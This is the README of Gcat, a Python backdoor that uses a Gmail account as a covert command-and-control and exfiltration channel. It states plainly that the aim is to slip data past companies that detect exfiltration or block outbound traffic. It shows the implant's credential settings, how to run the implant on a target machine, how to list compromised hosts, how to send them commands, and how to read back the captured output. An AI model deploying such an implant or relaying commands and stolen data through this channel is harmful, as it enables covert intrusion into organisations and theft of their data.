Description
-----------

I'm sure we're all aware of the venerable netcat.  Gcat is a close cousin
to netcat.  Rather than simply piping communications over plaintext tcp; gcat
communicates using gmail.  The idea here is that many companies might detect
suspicious data exfiltration.  Or might block direct communications out.
But if these companies allow their users to access gmail, we can pipe out
through that.

Gcat works in two parts.

Example 1: Deploying an Implant
-------------------------------

Configuring gcat and its implant is quite simple.  You need to have a
gmail account that you plan to use.  Then simply pop the username and
password into the two scripts gcat.py and implant.py as the "gmail_user"
and "gmail_pwd" variables.

		#########################################
		gmail_user = 'gcat.is.the.shit@gmail.com'
		gmail_pwd = 'veryc00lp@ssw0rd'
		server = 'smtp.gmail.com'
		server_port = 587
		#########################################

After you have set both gcat.py and implant.py to be properly configured
you can then run the implant on a target machine.

It's just a simple python script.

Example 2: Running a Command & Retrieving Output
------------------------------------------------

NOTE: Make sure that you have configured your gmail account to work with "less secure apps."  To get instructions on how to do that (it's easy, I promise) go here: https://support.google.com/accounts/answer/6010255?hl=en


Once you have an implant or two running you can control them from gcat.py.
To start we will want to get the list of all attached implants and their ids.
To do this run gcat.py with the -list option.

`/opt/gcat$` **`python ./gcat.py -list`**

		90b2cd83-cb36-52de-84ee-99db6ff41a11 Windows-XP-5.1.2600-SP3-x86

Now that we've got a list of attached implants, let's send a command to one.

`/opt/gcat$` **`python ./gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -cmd 'ipconfig /all'`**

		[*] Command sent successfully with jobid: SH3C4gv

Outstanding.  As you can see, we had to specify the id in conjunction with
the issuance of our command.  This might seem weird to you.  It certainly is
different from traditional netcat.  But think of the id as something akin
to the traditional host.

We do need to send another request in order to retrieve the output from
the command.  That's what the job id is for.

`/opt/gcat$` **`python ./gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -jobid SH3C4gv`**

		DATE: 'Tue, 09 Jun 2015 06:51:44 -0700 (PDT)'
		JOBID: SH3C4gv
		FG WINDOW: 'Command Prompt - C:\Python27\python.exe implant.py'
		CMD: 'ipconfig /all'


		Windows IP Configuration

				Primary Dns Suffix  . . . . . . . :
				Node Type . . . . . . . . . . . . : Unknown
				IP Routing Enabled. . . . . . . . : No
				WINS Proxy Enabled. . . . . . . . : No

		-- SNIP -

There you go.  That's the basic usage of Gcat.
